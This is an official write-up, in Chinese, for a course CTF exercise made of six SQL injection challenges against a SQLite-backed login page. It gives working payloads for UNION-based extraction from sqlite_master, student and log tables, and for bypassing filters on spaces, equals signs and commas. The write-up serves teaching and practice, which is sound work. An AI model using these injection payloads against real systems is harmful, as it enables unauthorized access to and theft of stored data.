# 信安实践II级第一次官方题解

## PB19061294 武汉

## ⚠某邪恶的卷王计划——图谋不轨I

直接按照要求将学号和 token 正确输入，然后账号密码默认都是自己的学号，拿到第一个 flag

## ⚠某邪恶的卷王计划——图谋不轨II

其实这个注入只要能找到，后面的就几乎一样了。所以这里说的详细一些：

首先判断注入点类型，如果你按照数字型的思路去试的话，会一直报账号密码不正确的错误，说明我们没有构造出注入。考虑是字符串型的注入，可以测试出后端闭合使用的是单引号(测试方式是`1' and 1=2;--`,发现成功回显。)

这时我们就可以思考一下原来的 sql 语句可能是什么样子了。

```sqlite
select a,b,...,x from xxx where uid='+你输入的学号+' and pswd='+你输入的密码+';
```

这个 sql 语句里面 a,b,..x 和 xxx 表明我们不知道表名和列名，需要一会儿去查 sqlite_master 表。a,b...,x的列数也未知，需要我们试出来。

我们发现只能回显一行，所以我们构造的联合查询语句要使得前面的语句回显0条，后面的语句回显一条。于是可以输入`1' and 1=2 union select 1,2,3 ;--` 测试列数，发现报错(因为union需要前后列数相等)，于是我们改成4列，即`1' and 1=2 union select 1,2,3,4 ;--` 发现成功进入，因此这说明我们前面 a,b...,x 的列数是4。接下来我们可以查 sqlite_master 表看看这个数据库里都有哪些表。`1' and 1=2 union select 1,2,count(*),sql from sqlite_master ;--`。我们发现只有一个表，并且它创立时的 sql 语句是 `CREATE TABLE student (UID TEXT NOT NULL, PASSWORD TEXT NOT NULL, LASTGPA TEXT NOT NULL, GRADE TEXT NOT NULL, RANK INT NOT NULL, SINGLE TEXT NOT NULL)`我们要找自己的`single`字段，注意是**自己**的，这个数据库里，除了自己的数据别人的都是'this is single'之类无意义的数据，只有自己的才是 flag 。因此要在 payload 里加上一个 where 限定，最后结果如下:`1' and 1=2 union select 1,2,3,single from student where uid="你的学号" ;--`

## ⚠某邪恶的卷王计划——图谋不轨III

第三问和第二问注入点是一样的，我们只需要考虑如何获取第一名的成绩就行了。依然是一个 where 限定，我这里直接给结果：`1' and 1=2 union select 1,2,3,grade from student where rank=1 ;--`

## ⚠某邪恶的卷王计划——力挽狂澜I

后三道题目加入了过滤，第四道的过滤是空格(可以试出来，会报hacker)，这样我们需要把空格修改为`/**/`进行绕过。另外后三道里面除了 student 表之外还有一个 log 表(查询所有表的方法已如上述)，我们需要查到 log 表里我们自己的 operate 内容，除了过滤之外应该和上面的区别不大。

payload : `1'/**/and/**/1=2/**/union/**/select/**/1,2,3,operate/**/from/**/log/**/where/**/uid="你的学号";--`

## ⚠某邪恶的卷王计划——力挽狂澜II

倒数第二道除了过滤空格之外又过滤了等号，这个其实很容易绕过，我们可以使用不等号(`<>`)、like、或者`in`等方式解决

payload : `1'/**/and/**/0/**/union/**/select/**/1,2,3,operate/**/from/**/log/**/where/**/uid/**/like/**/"你的学号";--`

## ⚠某邪恶的卷王计划——力挽狂澜III

第三问的过滤就稍微有一点难了，过滤了逗号，我们需要用 join 连接

payload:`1'/**/and/**/0/**/union/**/select/**/*/**/from/**/(select/**/operate/**/from/**/log/**/where/**/uid/**/like/**/"你的学号")/**/join/**/(select/**/1)/**/join/**/(select/**/1)/**/join/**/(select/**/1);--`

## 小结

总体来看我觉得大家做的都还是很不错的b（￣▽￣）d　，题目出来之后有人试做说太难了，我觉得后面几个人出的比我的要难（可能是别的方向我不熟吧-.-
